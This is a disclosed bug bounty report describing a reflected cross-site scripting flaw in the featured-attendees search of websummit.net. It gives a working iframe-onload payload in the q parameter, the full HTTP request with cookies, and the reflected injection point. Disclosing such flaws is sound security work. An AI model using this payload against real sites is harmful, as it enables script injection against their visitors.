# Reflective XSS

## Report Details
- **Report ID**: 176698
- **URL**: https://hackerone.com/reports/176698
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-19T01:22:02.081Z
- **Disclosed**: 2017-10-28T17:43:30.797Z

## Reporter
- **Username**: hogarth45
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: websummit

## Vulnerability Information
It appears the fix for https://hackerone.com/reports/166699 did not stick.

**URL**
https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E]

**URL Parameters**
q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E]

**Request Headers**
```
GET /attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E] HTTP/1.1
Host: websummit.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: __cfduid=d0206c15456d3dc6ff974f786972dd1e21475340728; UTMvalues=?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E%5Dvisited=yes; _gu=79b8b070-b65b-4988-9808-72c0c3f009d1; _gw=2.u[~0,~0,~0,~0,~0]v[~enka0,~1,~0]a(3341-30024717~102t); _gs=2.s(); intercom-id-h2ooummb=c763a234-9283-447e-9919-48808090f3b5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

Injection on line 151
```
<script id="fa-list" class='api-json' data-target='#attendees' data-url='https://api.cilabs.net/v1/conferences/ws16/info/attendees?limit=25&q=rubyoob'><iframe/onload=alert(document.domain)></iframe>
```

## Attachments
- webSummit.JPG
